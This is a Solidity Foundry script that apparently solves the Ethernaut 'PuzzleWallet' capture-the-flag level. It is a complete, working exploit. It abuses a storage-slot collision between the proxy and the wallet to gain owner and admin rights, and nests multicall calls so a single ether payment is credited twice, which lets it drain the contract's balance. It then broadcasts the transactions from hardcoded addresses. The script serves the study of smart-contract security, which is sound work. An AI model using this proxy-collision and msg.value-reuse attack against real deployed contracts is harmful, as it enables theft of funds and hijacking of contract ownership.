// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/PuzzleWallet.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();

        PuzzleProxy proxy = PuzzleProxy(payable(0xcB9008470a7B487Bf8bdc540dbe07C46101478F1));
        PuzzleWallet wallet = PuzzleWallet(address(proxy)); // can use functions of wallet, but it is fallback
        address player = 0x5970cDC9c38Ac77e77d3114D6D2365dAb44aBbb9;

        proxy.proposeNewAdmin(player);
        wallet.addToWhitelist(player);

        bytes[] memory deposit_call = new bytes[](1);
        deposit_call[0] = abi.encodePacked(wallet.deposit.selector);

        bytes[] memory multicall_data = new bytes[](3);
        multicall_data[0] = abi.encodePacked(wallet.deposit.selector);
        multicall_data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_call);
        multicall_data[2] = abi.encodeWithSelector(wallet.execute.selector, address(0x123), 0.002 ether, bytes(""));

        // multicall -> (1. deposit, 2. multicall -> deposit, 3. execute)
        wallet.multicall{value: 0.001 ether}(multicall_data);
        wallet.setMaxBalance(uint256(uint160(player)));

        console.log(proxy.admin());

        vm.stopBroadcast();
    }
}